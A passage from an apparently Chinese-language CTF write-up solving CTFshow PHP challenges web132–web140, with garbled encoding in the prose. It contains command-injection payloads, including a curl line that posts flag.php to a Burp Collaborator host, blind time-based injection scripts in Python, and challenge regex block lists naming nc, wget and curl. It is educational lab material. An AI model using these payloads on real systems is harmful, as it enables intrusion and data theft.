&amp;&amp; <span class="literal">false</span> || <span class="literal">true</span>)&#123;   <span class="comment">//‰πüÂ∞±ÊòØ(flase || true)</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="number">667</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ËæìÂá∫ÁªìÊûúÔºö666</span></span><br></pre></td></tr></table></figure><p>ÈÄªËæë‰πüÂæàÂ•ΩÁêÜËß£ÔºåÊâÄ‰ª•Êàë‰ª¨Âè™ÈúÄË¶ÅÊª°Ë∂≥<code>username=admin</code>ËøáÁ¨¨‰∏Ä‰∏™ifÊù°‰ª∂Ôºå<code>code=admin</code>Êª°Ë∂≥Á¨¨‰∫å‰∏™ifÊù°‰ª∂Âç≥ÂèØÔºåpaylaod‰∏∫</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username&#x3D;admin&amp;code&#x3D;admin&amp;password&#x3D;dotast</span><br></pre></td></tr></table></figure><p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web132/%24V_8VKNGG6%5DXJ%5BO2%40NV%7D9%60G.png" alt=""></p><h3 id="web133"><a class="header-anchor" href="#web133">¬∂</a>web133</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>($F = @$_GET[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;</span>, $F))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(substr($F,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;6‰∏™Â≠óÊØçÈÉΩËøò‰∏çÂ§üÂëÄ?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>ËøôÈáåÈôêÂà∂‰∫Ü‰∏Ä‰∫õÂëΩ‰ª§ÊâßË°åËØ≠Âè•Âπ∂‰∏îËøòÈôêÂà∂‰∫Ü6‰∏™Êï∞Â≠óÔºåÊàë‰ª¨ÂèØ‰ª•ÈááÂèñÂ•óÂ®ÉÁöÑÊñπÂºèÊù•Ëé∑ÂæóÊõ¥Â§öÊéßÂà∂ËØ≠Âè•ÁöÑÁ©∫Èó¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">get‰º†ÂèÇÔºöF&#x3D;&#96;$F &#96;;sleep 6</span><br><span class="line"></span><br><span class="line">ÁªèËøásubstr($F,0,6)Êà™ÂèñÂêé ÂæóÂà∞ &#96;$F &#96;; ‰∏ÄÂÖ±6‰∏™Â≠óÁ¨¶,‰πãÂâçËØ¥Ëøá&#96;&#96;ÂèçÂºïÂè∑Á≠â‰∫éshell_execÊâßË°åÂëΩ‰ª§</span><br><span class="line">eval(&quot;&#96;$F &#96;;sleep 6&quot;); </span><br><span class="line">ËÄå$FÂ∞±ÊòØÊàë‰ª¨ËæìÂÖ•ÁöÑ&#96;$F &#96;;sleep 6 ÊúÄÂêéÊâßË°åÁöÑ‰ª£Á†ÅÂ∫îËØ•ÊòØ&#96;&#96;$F&#96;;+sleep 3&#96;</span><br><span class="line">ËøôÊ†∑Â∞±ÊàêÂäüÊâßË°å‰∫Ü sleep 6ÔºåÂèØ‰ª•ÁúãÂà∞ÂèëÂåÖÂêéÂª∂Èïø‰∫Ü6ÁßíÂ∑¶Âè≥</span><br><span class="line">ÂâçÈù¢ÁöÑÂëΩ‰ª§ÊòØÊâßË°åÊàë‰ª¨ÁöÑ$FÔºåÂêéÈù¢ÁöÑÂëΩ‰ª§Êàë‰ª¨Â∞±ÂèØ‰ª•Ëá™ÂÆö‰πâ$FËØ≠Âè•</span><br></pre></td></tr></table></figure><p>ËøôÈáåÈ¶ñÂÖàÊâìÂºÄburpsuiteÈáåÁöÑCollaborator Client<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web133/%5BJ8M4TZG%7B09R%28%5BFYR_0I6%7D8.png" alt=""><br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web133/Z%5B%5BK%29X0Y%29B%28LG%40%28%60T%28P8%5B0Y.png" alt=""><br>payload‰∏∫</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?F&#x3D;&#96;$F &#96;;curl -X POST -F aaa&#x3D;@flag.php gn7nld7jteju8f8ww19yhgwfc6ix6m.burpcollaborator.net</span><br></pre></td></tr></table></figure><h3 id="web134"><a class="header-anchor" href="#web134">¬∂</a>web134</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$key1 = <span class="number">0</span>;</span><br><span class="line">$key2 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;key1&#x27;</span>]) || <span class="keyword">isset</span>($_GET[<span class="string">&#x27;key2&#x27;</span>]) || <span class="keyword">isset</span>($_POST[<span class="string">&#x27;key1&#x27;</span>]) || <span class="keyword">isset</span>($_POST[<span class="string">&#x27;key2&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nonononono&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@parse_str($_SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>]);</span><br><span class="line">extract($_POST);</span><br><span class="line"><span class="keyword">if</span>($key1 == <span class="string">&#x27;36d&#x27;</span> &amp;&amp; $key2 == <span class="string">&#x27;36d&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(file_get_contents(<span class="string">&#x27;flag.php&#x27;</span>));</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>ÁúãÂà∞<code>parse_str()</code>ÂáΩÊï∞Âíå<code>extract()</code>ÂáΩÊï∞ÔºåÂèØ‰ª•ÁúãÂæóÂá∫ÊòØÂèòÈáèË¶ÜÁõñÔºåËøô‰∏§‰∏™ÂáΩÊï∞ÂâçÈù¢ÁöÑÈ¢òÈÉΩËÆ≤Ëøá‰∫ÜÔºåÊàë‰ª¨ÂÜçÁÆÄÂçïËÆ≤‰∏Ä‰∏ãÊµÅÁ®ã</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">parse_str($_SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>]);</span><br><span class="line">var_dump($_POST);</span><br></pre></td></tr></table></figure><p>Â¶ÇÊûúÊàë‰ª¨‰º†ÂÖ•?_POST[a]=dotastÔºåÂ∞±‰ºöËæìÂá∫<code>array(1) &#123; [&quot;a&quot;]=&gt; string(6) &quot;dotast&quot; &#125;</code>ÔºåÂÜç‰ΩøÁî®extractÂáΩÊï∞ÔºåÂ∞±‰ºöÂèòÊàê<code>$a=dotast</code><br>ÊâÄ‰ª•payload‰∏∫</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?_POST[key1]&#x3D;36d&amp;_POST[key2]&#x3D;36d</span><br></pre></td></tr></table></figure><h3 id="web135"><a class="header-anchor" href="#web135">¬∂</a>web135</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">?php</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>($F = @$_GET[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">  <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i&#x27;</span>, $F))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(substr($F,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Â∏àÂÇÖ‰ª¨Â±ÖÁÑ∂Á†¥Ëß£‰∫ÜÂâçÈù¢ÁöÑÔºåÈÇ£Â∞±Êù•‰∏Ä‰∏™Âä†Âº∫ÁâàÂêß&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>Âú®web133Âü∫Á°Ä‰∏äÂ§öban‰∫ÜÂæàÂ§öÂáΩÊï∞ÔºåcpÂ§çÂà∂Âà∞ËÉΩËÆøÈóÆÁöÑÊñáÊú¨Â∞±ÂèØ‰ª•ÔºåÊâÄ‰ª•payload‰∏∫</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?F&#x3D;&#96;$F &#96;;cp flag.php 2.txt</span><br></pre></td></tr></table></figure><h3 id="web136"><a class="header-anchor" href="#web136">¬∂</a>web136</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">$x</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, $x))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    check($c);</span><br><span class="line">    exec($c);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>ËøôÈáåban‰∫ÜÂ§ßÈáèÂáΩÊï∞ÂíåÂ≠óÁ¨¶Ôºå‰∏çËøáÂú®linux‰∏ãËøòÊúâ‰∏Ä‰∏™ÂëΩ‰ª§tee</p><blockquote><p>Linux teeÂëΩ‰ª§Áî®‰∫éËØªÂèñÊ†áÂáÜËæìÂÖ•ÁöÑÊï∞ÊçÆÔºåÂπ∂Â∞ÜÂÖ∂ÂÜÖÂÆπËæìÂá∫ÊàêÊñá‰ª∂<br>Áî®Ê≥ï:<br>tee file1 file2 //Â§çÂà∂Êñá‰ª∂<br>ls|tee 1.txt <a target="_blank" rel="noopener" href="//xn--1-006as2hgg48hc72k.xn--txt-x68dy9al71g">//ÂëΩ‰ª§ËæìÂá∫Âà∞1.txtÊñá‰ª∂‰∏≠</a></p></blockquote><p>È¶ñÂÖàÊü•Áúã‰∏Ä‰∏ãÊ†πÁõÆÂΩïÊñá‰ª∂</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;ls &#x2F;|tee dotast</span><br></pre></td></tr></table></figure><p>Êé•ÁùÄËÆøÈóÆdotastËøõË°å‰∏ãËΩΩ<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web136/%2892T~FC5~751I%7B%29T%25R%28HKJ6.png" alt=""><br>ËØªÂèñf149_15_h3r3Êñá‰ª∂Âà∞dotast‰∏≠ÔºåÁªßÁª≠‰∏ãËΩΩÊü•Áúã<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web136/%25VRI%2409%2915%25TXNSU%40FKZ~BN.png" alt=""><br>ÂæóÂà∞flag</p><h3 id="web137"><a class="header-anchor" href="#web137">¬∂</a>web137</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;private class&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">call_user_func($_POST[<span class="string">&#x27;ctfshow&#x27;</span>]); </span><br></pre></td></tr></table></figure><p>Ê≤°ÊúâÈöæÂ∫¶ÔºåÂ∞±ÊòØÁõ¥Êé•Ë∞ÉÁî®ctfshowÁ±ª‰∏≠ÁöÑgetFlagÊñπÊ≥ïÂ∞±Â•ΩÔºåpaylaod‰∏∫</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">post:</span><br><span class="line">ctfshow&#x3D;ctfshow::getFlag</span><br></pre></td></tr></table></figure><p>ËÆ∞ÂæóÂè≥ÈîÆÊü•ÁúãÊ∫êÁ†Å</p><h3 id="web138"><a class="header-anchor" href="#web138">¬∂</a>web138</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;private class&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(strripos($_POST[<span class="string">&#x27;ctfshow&#x27;</span>], <span class="string">&quot;:&quot;</span>)&gt;<span class="number">-1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;private function&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">call_user_func($_POST[<span class="string">&#x27;ctfshow&#x27;</span>]); </span><br></pre></td></tr></table></figure><p>Âú®Ââç‰∏ÄÈ¢òÂü∫Á°Ä‰∏äÊääÂÜíÂè∑Áªôban‰∫ÜÔºå‰ΩÜ<code>call_user_func</code>ÊîØÊåÅ‰º†ÂÖ•Êï∞ÁªÑÂΩ¢Âºè</p><blockquote><p>call_user_func(array($ctfshow, ‚ÄògetFlag‚Äô));<br>ËøôÊó∂ÂÄô‰ºöË∞ÉÁî®ctfshow‰∏≠ÁöÑgetFlagÊñπÊ≥ï</p></blockquote><p>ÊâÄ‰ª•payload‰∏∫</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow[0]&#x3D;ctfshow&amp;ctfshow[1]&#x3D;getFlag</span><br></pre></td></tr></table></figure><h3 id="web139"><a class="header-anchor" href="#web139">¬∂</a>web139</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">$x</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, $x))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    check($c);</span><br><span class="line">    exec($c);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>ÂíãÁúãÂ•Ω‰ººÂíå‰πãÂâçÁöÑÈ¢òÊ≤°ÂèòÂåñÔºå‰ΩÜÂ•ΩÂÉèban‰∫ÜÂÜôÂÖ•Êñá‰ª∂ÁöÑÊùÉÈôêÔºåÊ≤°ÊúâÂõûÊòæ‰∫ÜÔºåÂè™ËÉΩÂºÄÂßãÁõ≤Ê≥®‰∫ÜÔºåËøôÈáåÂéª‰∫ÜËß£‰∫Ü‰∏Ä‰∏ãshellÁºñÁ®ãüòø<br>Âà©Áî®shellÁºñÁ®ãÁöÑifÂà§Êñ≠ËØ≠Âè•ÈÖçÂêàawk‰ª•ÂèäcutÂëΩ‰ª§Êù•Ëé∑Âèñflag<br>awkÈÄêË°åËé∑ÂèñÊï∞ÊçÆ<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web139/U%60%7BH%5DKW%7D_79%60BM%25%40HSKF%259R.png" alt=""><br>cutÂëΩ‰ª§ÈÄêÂàóËé∑ÂèñÂçï‰∏™Â≠óÁ¨¶<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web139/LES%24GLDZX%7D09Y03%7DAVE92_U.png" alt=""><br>Âà©Áî®ifËØ≠Âè•Êù•Âà§Êñ≠ÂëΩ‰ª§ÊòØÂê¶ÊâßË°å<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web139/%24FR_P%5D%5BX%5BYIWN%5DSNEO7GGD7.png" alt=""><br>Áî®ÂëΩ‰ª§<code>ls \</code>Êü•ÁúãÊ†πÁõÆÂΩïÊù•Ëé∑ÂèñflagÊñá‰ª∂ÂêçÔºåËÑöÊú¨Â¶Ç‰∏ã</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/2/28 1:25</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://1bb8ea48-6413-47ef-94bb-8dd313c14c9e.chall.ctf.show:8080/&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">15</span>):</span><br><span class="line">        <span class="comment">#asciiÁ†ÅË°®</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">            k=chr(k)</span><br><span class="line">            payload = <span class="string">&quot;?c=&quot;</span> + <span class="string">f&quot;if [ `ls / | awk NR==<span class="subst">&#123;i&#125;</span> | cut -c <span class="subst">&#123;j&#125;</span>` == <span class="subst">&#123;k&#125;</span> ];then sleep 2;fi&quot;</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                requests.get(url=url+payload, timeout=(<span class="number">1.5</span>,<span class="number">1.5</span>))</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                result = result + k</span><br><span class="line">                print(result)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    result += <span class="string">&quot; &quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web139/%7B7%5D%29%40V~%60CK9%5DLC1ZWF~%40L%28E.png" alt=""><br>ÂèëÁé∞‰∏Ä‰∏™Êñá‰ª∂ÂêçÊòØf149_15_h3r3ÁöÑÊñá‰ª∂ÔºåflagÂ∞±Âú®ËøôÈáåËæπÔºåÈÇ£Â∞±Êîπ‰∏Ä‰∏ãËÑöÊú¨cat‰∏Ä‰∏ã</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/2/28 1:25</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://1bb8ea48-6413-47ef-94bb-8dd313c14c9e.chall.ctf.show:8080/&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    <span class="comment">#asciiÁ†ÅË°®</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        k=chr(k)</span><br><span class="line">        payload = <span class="string">&quot;?c=&quot;</span> + <span class="string">f&quot;if [ `cat /f149_15_h3r3 | cut -c <span class="subst">&#123;j&#125;</span>` == <span class="subst">&#123;k&#125;</span> ];then sleep 2;fi&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            requests.get(url=url+payload, timeout=(<span class="number">1.5</span>,<span class="number">1.5</span>))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            result = result + k</span><br><span class="line">            print(result)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">result += <span class="string">&quot; &quot;</span></span><br></pre></td></tr></table></figure><p>ÂæóÂà∞flag<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web139/AK861%28EZ0%60FOYCLYCXS%29XYE.png" alt=""><br>ÈúÄË¶ÅÂä†‰∏ä<code>&#123;&#125;</code></p><h3 id="web140"><a class="header-anchor" href="#web140">¬∂</a>web140</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;f1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">&#x27;f2&#x27;</span>]))&#123;</span><br><span class="line">    $f1 = (<span class="keyword">String</span>)$_POST[<span class="string">&#x27;f1&#x27;</span>];</span><br><span class="line">    $f2 = (<span class="keyword">String</span>)$_POST[<span class="string">&#x27;f2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]+$/&#x27;</span>, $f1))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]+$/&#x27;</span>, $f2))&#123;</span><br><span class="line">            $code = <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$f1</span>(<span class="subst">$f2</span>());&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(intval($code) == <span class="string">&#x27;ctfshow&#x27;</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÊúÄÂêéifÂà§Êñ≠Âº±ÊØîËæÉÁ≠â‰∫é‚Äúctfshow‚ÄùÁöÑÊó∂ÂÄôËæìÂá∫flagÔºåÁúã‰∏Ä‰∏ãÂº±ÊØîËæÉÂèÇËÄÉË°®<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web140/QM41DXT%5BCS0X%7DUT%25P%29FY5BS.png" 